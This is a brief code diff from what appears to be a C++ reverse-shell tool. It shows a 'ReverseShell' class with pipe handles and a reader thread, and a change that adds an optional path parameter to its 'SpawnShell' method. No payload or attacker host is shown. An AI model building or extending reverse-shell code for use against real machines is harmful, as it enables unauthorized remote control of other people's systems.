@@ -203,7 +203,7 @@ class ReverseShell {
 		HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
 		std::thread tRead;
 	public:
-		bool SpawnShell(const char* pStrComando);
+		bool SpawnShell(const char* pStrComando, const char* cPath = NULL);
 		void StopShell();		
 		void TerminarShell();
 
